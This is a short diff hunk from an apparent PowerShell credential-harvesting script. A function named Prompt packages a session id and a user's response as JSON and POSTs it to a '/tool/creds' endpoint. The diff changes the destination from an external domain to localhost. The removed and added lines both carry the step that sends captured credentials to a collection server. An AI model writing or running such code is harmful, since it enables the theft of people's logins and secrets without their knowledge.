@@ -26,7 +26,7 @@ function Prompt{
         sid=$sid;
         response=$response;}
     $json = $params | ConvertTo-Json
-    Invoke-WebRequest -Uri https://covidframework.com/tool/creds -Method POST -Body $json -ContentType "application/json"
+    Invoke-WebRequest -Uri https://localhost:3000/tool/creds -Method POST -Body $json -ContentType "application/json"
     exit;
 }
 Prompt
